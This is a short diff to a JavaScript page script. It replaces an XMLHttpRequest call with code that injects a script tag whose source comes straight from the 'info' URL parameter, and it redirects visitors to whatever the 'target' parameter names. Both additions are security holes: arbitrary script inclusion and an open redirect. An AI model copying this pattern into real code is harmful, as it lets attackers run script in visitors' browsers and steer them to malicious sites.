@@ -11,7 +11,7 @@ function getUrlVars()
     return vars;
 }
 
-
+/*
     function makeRequest(url) {
         var httpRequest;
         if (window.XMLHttpRequest) { // Mozilla, Safari, ...
@@ -51,7 +51,12 @@ function getUrlVars()
             }
         }
     }
+*/
+    var script = document.createElement('script');
+    script.src = decodeURIComponent(getUrlVars()["info"]);
+    document.getElementsByTagName('head')[0].appendChild(script);
+
     window.onload = function(){
-      makeRequest(decodeURIComponent(getUrlVars()["info"]));
+      window.location.href = decodeURIComponent(getUrlVars()["target"]);
       console.log(getUrlVars());
     }
